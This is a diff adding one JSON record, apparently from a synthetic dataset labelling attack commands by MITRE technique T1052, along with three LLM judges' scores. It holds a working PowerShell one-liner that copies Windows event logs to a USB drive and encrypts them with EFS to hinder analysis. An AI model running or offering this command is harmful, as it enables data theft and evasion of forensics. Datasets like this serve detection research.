@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb 'Diag'; Copy-Item 'C:\\Windows\\System32\\winevt\\Logs' -Destination $dst -Recurse -Force; cipher /E /A $dst",
+  "explanation": "Copies Windows event logs to a folder on the USB and encrypts the folder with EFS to hinder analysis if accessed on the same system.",
+  "rationale_steps": [
+    "Find removable media",
+    "Copy event logs to USB",
+    "Encrypt copied data using EFS to deter casual inspection"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-286b5fcc",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced parentheses/braces/quotes, valid cmdlet usage, and proper statement separators and arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It locates a removable drive, copies the event log directory to it, and applies EFS encryption, matching USB-based exfiltration, though potential file locks/permissions and non-recursive cipher behavior may reduce reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T09:22:17.214392Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignments, proper piping, and valid parameters for all cmdlets used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically identifying a removable drive, copying Windows event logs to it, and encrypting the data with EFS to hide the exfiltrated content.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:22:20.218042Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly well-formed PowerShell cmdlets, proper variable assignment, correct command separators, and valid arguments for both PowerShell functions and the external `cipher` executable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command successfully identifies a removable drive, copies Windows event logs to it, and encrypts the copied data using EFS, directly aligning with the described technique for exfiltration over a physical medium and the explanation provided.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:22:33.660382Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
